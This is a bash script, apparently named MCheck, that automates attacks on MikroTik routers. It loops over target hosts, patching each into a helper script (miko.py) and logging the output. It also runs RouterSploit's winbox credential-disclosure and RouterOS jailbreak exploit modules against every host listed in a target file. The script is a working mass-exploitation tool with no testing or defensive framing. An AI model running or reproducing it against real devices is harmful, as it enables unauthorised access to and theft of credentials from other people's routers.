#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'
UBLUE='\033[4;34m'
URED='\033[4;31m'

# Root Check
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi
# Tiks.txt file for RouterSploit
if [[ -d '/opt/MCheck/files/tiks_rsf.txt' ]]; then
	sleep 1
else
	cp /opt/MCheck/files/tiks.txt /opt/MCheck/files/tiks_rsf.txt
fi
# New Target Thread for MCheck
target(){
	RARG=$(python scripts/get_t.py)
	VAR=$(echo ${RARG})
	FARG='host = "ARG"'
}
running(){
	mv files/tiks1.txt files/tiks.txt
	# Start
	TARG=$(cat scripts/miko.py | grep "host = *")
	sed -i "s/${TARG}/${FARG}/g" scripts/miko.py
	sed -i "s/ARG/${VAR}/g" scripts/miko.py
}
# Start of Mikro_Check
mchecker(){
	cd /opt/MCheck
	while :
	do
		echo "Press <CTRL+C> to exit."
		target
		running
		python scripts/miko.py | tee output.log
		SAVE=$(cat output.log)
		echo "${SAVE}" >> Micro_Check.results
		echo "==============================================================================================" >> Micro_Check.results
		rm output.log
	done
}
# Routersploit Vuln Check
rsf(){
	cd /root/routersploit
	for name in `cat /opt/MCheck/files/tiks_rsf.txt`
		do
			sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}"
			sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}"
		done
}
#MCheck Start
echo -e "${LP}"
figlet -f mini "MCheck"
echo -e "${NC}"
PS3='What tool would you like to use?'
	options=("MikroTik Auto-EX" "Routersploit Vuln Check")
    select opt in "${options[@]}"
		do
			case $opt in
				"MikroTik Auto-EX")
					mchecker
					;;

				"Routersploit Vuln Check")
					rsf
					;;

			esac
		done
